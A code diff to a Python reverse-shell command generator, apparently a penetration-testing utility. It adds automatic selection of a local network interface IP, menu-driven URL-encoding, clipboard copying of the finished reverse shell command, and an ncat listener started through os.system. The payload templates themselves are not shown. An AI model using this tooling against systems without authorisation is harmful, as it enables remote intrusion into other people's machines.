@@ -10,6 +10,7 @@ from typing import List
 import readchar
 from colorama import Fore, Style
 from pyperclip import copy
+from netifaces import *
 
 success = Style.BRIGHT + '[ ' + Fore.GREEN + '+' + Fore.RESET + ' ] ' + Style.RESET_ALL
 information = Style.BRIGHT + '[ ' + Fore.YELLOW + '!' + Fore.RESET + ' ] ' + Style.RESET_ALL
@@ -21,9 +22,7 @@ port = 443
 shell = '/bin/sh'
 command_key = 'nc plain'
 
-default_template = Template(
-    Style.BRIGHT + '[ default ' + Fore.GREEN + '$param' + Fore.RESET + ' ]' + Style.RESET_ALL + ' : ')
-header_template = Template(Style.BRIGHT + '===== [ ' + Fore.CYAN + '$param' + Fore.RESET + ' ] =====' + Style.RESET_ALL)
+header_template = Template('\n' + Style.BRIGHT + '===== || ' + Fore.CYAN + '$param' + Fore.RESET + ' || =====' + Style.RESET_ALL + '\n')
 
 shells = {
     'sh': '/bin/sh',
@@ -109,18 +108,29 @@ def select(
 
 
 def specify_ip():
-    print(header_template.safe_substitute(param='SPECIFY IP'))
-    while True:
-        global ip
-        input_ip = input(default_template.safe_substitute(param=ip))
-        if input_ip.__eq__(''):
-            break
-        elif is_valid(input_ip):
-            ip = input_ip
-            print(information + 'IP changed to -> ' + Style.BRIGHT + Fore.YELLOW + ip + Style.RESET_ALL)
-            break
-        else:
-            print(failure + 'Please, specify a valid IP address!')
+    print(header_template.safe_substitute(param='SELECT IP'))
+    options = {}
+    for interface in interfaces():
+        try:
+            ip_address = ifaddresses(interface)[AF_INET][0]['addr']
+            if ip_address != '127.0.0.1':
+                options[ip_address] = ip_address + ' IP address on interface ' + interface
+        except KeyError:
+            pass
+    options['other'] = 'Specify IP address manually'
+    key_index = select(list(options.values()))
+    global ip
+    ip = list(options.keys()).__getitem__(key_index)
+    if ip == 'other':
+        while True:
+            input_ip = input('Enter IP address: ')
+            if is_valid(input_ip):
+                ip = input_ip
+                print(information + 'IP changed to -> ' + Style.BRIGHT + Fore.YELLOW + ip + Style.RESET_ALL)
+                break
+            else:
+                print(failure + 'Please, specify a valid IP address!')
+    
 
 
 def specify_port():
@@ -128,7 +138,7 @@ def specify_port():
     while True:
         try:
             global port
-            input_port = input(default_template.safe_substitute(param=port))
+            input_port = input(Style.BRIGHT + '[ default ' + Fore.GREEN + str(port) + Fore.RESET + ' ]' + Style.RESET_ALL + ' : ')
             if input_port.__eq__(''):
                 break
             elif int(input_port) in range(1, 65535):
@@ -158,22 +168,27 @@ def select_shell():
 
 def build_command():
     command = commands.get(command_key).safe_substitute(ip=ip, port=port, shell=shell)
-    encode_command = input('URL encode the command? [y/N] -> ')
-    if encode_command.lower() == 'y':
+    print(header_template.safe_substitute(param='URL ENCODE'))
+    options = ['no', 'yes']
+    result = select(options)
+    if result == 1:
         command = urllib.parse.quote_plus(command)
         print(information + 'Command is now URL encoded!')
 
-    print(success + 'The finished command is: \n\n' + command + '\n')
+    print(header_template.safe_substitute(param='FINISHED COMMAND'))
+    print(Style.BRIGHT + Fore.YELLOW + command + Fore.RESET + Style.RESET_ALL + '\n')
 
     if 'SSH_CLIENT' not in os.environ or 'SSH_TTY' not in os.environ:
         copy(command)
-        print(success + 'Reverse shell command copied to clipboard!')
+        print(information + 'Reverse shell command copied to clipboard!')
 
 
 def setup_listener():
-    listener = input('Do you want to setup a listener? [Y/n] : ')
-    if listener.__eq__('') or listener.lower() == 'y':
-        print(success + 'Waiting for connections...')
+    print(header_template.safe_substitute(param='SETUP LISTENER'))
+    options = ['no', 'yes']
+    result = select(options)
+    if result == 1:
+        print('\n' + success + 'Waiting for incoming connections...')
         os.system('ncat -lp ' + str(port))
     else:
         exit_program()
